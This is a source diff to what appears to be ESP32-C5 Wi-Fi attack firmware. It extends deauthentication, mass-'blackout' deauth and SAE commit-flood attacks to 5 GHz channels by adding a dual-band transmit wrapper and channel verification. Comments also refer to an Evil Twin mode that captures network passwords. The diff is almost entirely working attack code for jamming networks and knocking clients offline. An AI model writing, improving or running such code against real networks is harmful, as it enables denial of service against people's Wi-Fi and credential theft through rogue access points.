@@ -2,6 +2,7 @@
 #include "wifi_scanner.h"
 #include "wifi_wardrive.h"
 #include "esp_wifi.h"
+#include "cym_rf_tx.h"   // cym_mgmt_tx(): DFS-safe management-frame TX gate
 #include "esp_log.h"
 #include "esp_event.h"
 #include "esp_timer.h"
@@ -290,7 +291,13 @@ static void deauth_attack_task(void *pvParameters) {
     if (target_count > 5) {
         ESP_LOGI(TAG, "  ... and %d more", target_count - 5);
     }
-    
+
+    // Dual-band TX readiness: assert band AUTO + full 5 GHz country mask ONCE so
+    // esp_wifi_set_channel() below accepts a 5 GHz target channel. Without this a
+    // 5 GHz target is silently rejected and the deauth goes out on the last 2.4
+    // GHz channel (the "5 GHz deauth transmits on 2.4" bug). See cym_rf_tx.h.
+    cym_mgmt_tx_prepare_dualband();
+
     while (deauth_attack_active && !g_operation_stop_requested) {
         // Don't send deauth ONLY when password verification is in progress
         // (STA is attempting to connect to real AP)
@@ -318,7 +325,15 @@ static void deauth_attack_task(void *pvParameters) {
             } else {
                 // If no clients connected or not Evil Twin mode, do normal channel hopping
                 vTaskDelay(50);  // Wait before channel change
-                esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
+                if (!cym_set_channel_verified(targets[i].channel)) {
+                    // Radio refused this channel (DFS 5 GHz 52-144: C5 can't TX there).
+                    // Skip TX so a 5 GHz-DFS target's deauth is never sprayed onto the
+                    // 2.4 GHz channel the radio was left on. See cym_rf_tx.h.
+                    uint8_t got = 0; wifi_second_chan_t gsc;
+                    esp_wifi_get_channel(&got, &gsc);
+                    ESP_LOGW(TAG, "[DEAUTH] ch %d rejected -> radio on ch %d, skip TX (DFS not TX-capable on C5)", targets[i].channel, got);
+                    continue;
+                }
                 vTaskDelay(50);  // Wait after channel change
             }
             
@@ -336,9 +351,9 @@ static void deauth_attack_task(void *pvParameters) {
             
             // Send multiple deauth frames (quiet - no spam)
             for (int j = 0; j < 5; j++) {
-                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+                esp_err_t err = cym_mgmt_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
                 if (err == ESP_ERR_INVALID_ARG) {
-                    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+                    cym_mgmt_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
                 }
                 if (err == ESP_OK) {
                     stats_deauth_sent++;
@@ -828,7 +843,12 @@ static void blackout_attack_task(void *pvParameters) {
         const int MAX_ATTACK_CYCLES = 100;
         
         uint8_t deauth_frame[sizeof(deauth_frame_template)];
-        
+
+        // Dual-band TX readiness (band AUTO + 5 GHz mask) ONCE before the hop
+        // loop so 5 GHz targets are deauthed on their real channel, not silently
+        // dropped to 2.4 GHz. See cym_rf_tx.h.
+        cym_mgmt_tx_prepare_dualband();
+
         while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active && !g_operation_stop_requested) {
             // Send deauth frames to all networks
             for (int i = 0; i < target_count; i++) {
@@ -839,11 +859,17 @@ static void blackout_attack_task(void *pvParameters) {
                     continue;
                 }
                 
-                // Set channel
+                // Set channel (verified: skip TX if the radio refused it — DFS 5 GHz
+                // on C5 — so we never spray a 5 GHz target's deauth onto 2.4 GHz).
                 vTaskDelay(pdMS_TO_TICKS(50));
-                esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
+                if (!cym_set_channel_verified(targets[i].channel)) {
+                    uint8_t got = 0; wifi_second_chan_t gsc;
+                    esp_wifi_get_channel(&got, &gsc);
+                    ESP_LOGW(TAG, "[BLACKOUT] ch %d rejected -> radio on ch %d, skip TX (DFS not TX-capable on C5)", targets[i].channel, got);
+                    continue;
+                }
                 vTaskDelay(pdMS_TO_TICKS(50));
-                
+
                 // Send deauth frame (template already has broadcast destination)
                 memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
                 memcpy(&deauth_frame[10], targets[i].bssid, 6); // Source: AP BSSID
@@ -856,7 +882,7 @@ static void blackout_attack_task(void *pvParameters) {
                          targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
                          targets[i].channel);
                 
-                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+                cym_mgmt_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
                 stats_deauth_sent++;
             }
             
@@ -1013,15 +1039,25 @@ static void sae_attack_task(void *pvParameters) {
     
     uint8_t sae_frame[sizeof(sae_commit_template) + 256];
     uint32_t frame_count = 0;
-    
+
+    // Dual-band TX readiness (band AUTO + 5 GHz mask) ONCE before the hop loop so
+    // a 5 GHz target's SAE flood goes out on its real channel. See cym_rf_tx.h.
+    cym_mgmt_tx_prepare_dualband();
+
     while (sae_attack_active && !g_operation_stop_requested) {
         for (int i = 0; i < target_count; i++) {
             if (!sae_attack_active || g_operation_stop_requested) break;
             
-            // Set channel
-            esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
+            // Set channel (verified: skip TX if refused — DFS 5 GHz on C5 — so a
+            // 5 GHz target's SAE flood is never sprayed onto 2.4 GHz).
+            if (!cym_set_channel_verified(targets[i].channel)) {
+                uint8_t got = 0; wifi_second_chan_t gsc;
+                esp_wifi_get_channel(&got, &gsc);
+                ESP_LOGW(TAG, "[SAE Overflow] ch %d rejected -> radio on ch %d, skip TX (DFS not TX-capable on C5)", targets[i].channel, got);
+                continue;
+            }
             vTaskDelay(50);
-            
+
             // Prepare SAE commit frame with random STA MAC
             memcpy(sae_frame, sae_commit_template, sizeof(sae_commit_template));
             memcpy(&sae_frame[4], targets[i].bssid, 6);   // Destination (AP)
@@ -1048,7 +1084,7 @@ static void sae_attack_task(void *pvParameters) {
                      targets[i].channel, (unsigned long)frame_count + 1);
             
             // Send frame
-            esp_wifi_80211_tx(WIFI_IF_AP, sae_frame, offset, false);
+            cym_mgmt_tx(WIFI_IF_AP, sae_frame, offset, false);
             frame_count++;
             
             vTaskDelay(pdMS_TO_TICKS(5));
